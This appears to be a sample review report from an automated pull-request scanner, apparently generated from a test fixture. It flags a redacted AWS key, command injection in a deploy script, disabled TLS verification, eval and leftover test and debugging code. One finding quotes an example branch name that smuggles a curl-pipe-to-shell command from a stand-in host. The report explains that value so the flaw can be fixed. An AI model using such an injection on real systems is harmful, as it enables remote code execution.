## PR Guardian review

**Status:** ⚠️ Completed with limitations · **Mode:** hybrid · **Reviewer:** v0.1.0

**AI reviewer:** recorded · model `fixture` · prompt `review-v1`

7 findings (4 high, 2 medium, 1 low) in 4 analyzed files.

### Findings

#### High (4)

##### 1. Possible hardcoded credential (AWS access key ID)

- **Location:** `src/config.ts` line 4
- **Category:** security · **Confidence:** 0.90 · **Source:** static-analysis (`builtin/hardcoded-secret`)

This added line matches the format of a real credential. Secrets committed to source control are exposed to everyone with read access and remain in git history even after removal.

**Evidence**

```text
accessKeyId: '[REDACTED AWS access key ID]',
```

**Suggested fix:** Remove the value, load it from an environment variable or secret manager, and rotate the credential if it was ever valid.

##### 2. Branch name passed to a shell command without validation

- **Location:** `src/deploy.ts` line 4
- **Category:** security · **Confidence:** 0.80 · **Source:** ai (`ai/review-v1`)

deploy() interpolates its branch argument into a shell command. A branch name such as `main; curl evil.sh | sh` would run arbitrary commands on the deploy host.

**Evidence**

```text
execSync(`git push origin ${branch}`);
```

**Suggested fix:** Use execFileSync('git', \['push', 'origin', branch\]) so no shell is involved.

##### 3. Shell command built with string interpolation

- **Location:** `src/deploy.ts` line 4
- **Category:** security · **Confidence:** 0.60 · **Source:** static-analysis (`builtin/shell-command-interpolation`)

`exec`/`execSync` run their argument through a shell. Interpolating values into the command string allows command injection if any value can be influenced by a user.

**Evidence**

```text
execSync(`git push origin ${branch}`);
```

**Suggested fix:** Use `execFile`/`spawn` with an argument array (no shell), or strictly validate every interpolated value.

##### 4. TLS certificate verification disabled

- **Location:** `src/http-client.ts` line 5
- **Category:** security · **Confidence:** 0.85 · **Source:** static-analysis (`builtin/tls-verification-disabled`)

Disabling certificate verification lets anyone on the network path impersonate the server and read or modify the traffic.

**Evidence**

```text
return new https.Agent({ keepAlive: true, rejectUnauthorized: false });
```

**Suggested fix:** Keep verification enabled. For private certificate authorities, pass the CA certificate (for example via the `ca` option or NODE_EXTRA_CA_CERTS) instead.

#### Medium (2)

##### 5. Dynamic code execution

- **Location:** `src/config.ts` line 9
- **Category:** security · **Confidence:** 0.70 · **Source:** static-analysis (`builtin/dynamic-code-execution`)

`eval`, `new Function` and string arguments to `setTimeout`/`setInterval` execute arbitrary code. If any part of the string can be influenced by input, this is a code-injection vector; it also defeats static analysis.

**Evidence**

```text
return eval(expression);
```

**Suggested fix:** Replace with explicit logic (for example a lookup table or `JSON.parse` for data), or pass a function instead of a string to timers.

##### 6. Focused test left in code

- **Location:** `tests/math.test.ts` line 4
- **Category:** testing · **Confidence:** 0.95 · **Source:** static-analysis (`builtin/focused-test`)

`.only` (or `fit`/`fdescribe`) makes the test runner skip every other test in the file or suite, so CI can pass while most tests silently do not run.

**Evidence**

```text
it.only('adds', () => {
```

**Suggested fix:** Remove `.only` (or rename `fit`/`fdescribe` back to `it`/`describe`) before merging.

#### Low (1)

##### 7. Debugger statement left in code

- **Location:** `src/config.ts` line 8
- **Category:** reliability · **Confidence:** 0.95 · **Source:** static-analysis (`builtin/debugger-statement`)

A `debugger` statement pauses execution whenever developer tools or an inspector are attached, and is almost always a leftover from debugging.

**Evidence**

```text
debugger;
```

**Suggested fix:** Remove the `debugger` statement.

### Analyzers

| Analyzer | Status | Findings |
| --- | --- | --- |
| `builtin-rules` | succeeded | 6 |
| `ai:recorded/fixture` | succeeded | 1 |

### Files

Analyzed: 4 · Not analyzed: 0

### Limitations

- Analyzer ai:recorded/fixture could not analyze every eligible file; see diagnostics.
- Only added lines are analyzed, line by line, with a fixed rule set; issues that depend on wider context are not detected.
- The AI reviewer sees only the changed hunks, not the rest of the repository; its findings are model output that passed format and evidence checks, not verified defects.

<details><summary>Diagnostics</summary>

- `ai:recorded/fixture`: Not sent to the model: src/config.ts (it contains a possible secret, so it was not sent to the model).
- `ai:recorded/fixture`: The model reviewed 3 of 4 eligible files.
- `ai:recorded/fixture`: Dropped AI finding #2: it references a file the model was not shown.
- `ai:recorded/fixture`: Dropped AI finding #3: its evidence does not quote an added line of the diff.

</details>

---

<sub>PR Guardian is an automated assistant, not an authority. A review with no findings does not mean the code is correct or secure. Confidence values are heuristics, not calibrated probabilities. Generated 2026-01-01T00:00:00.000Z.</sub>
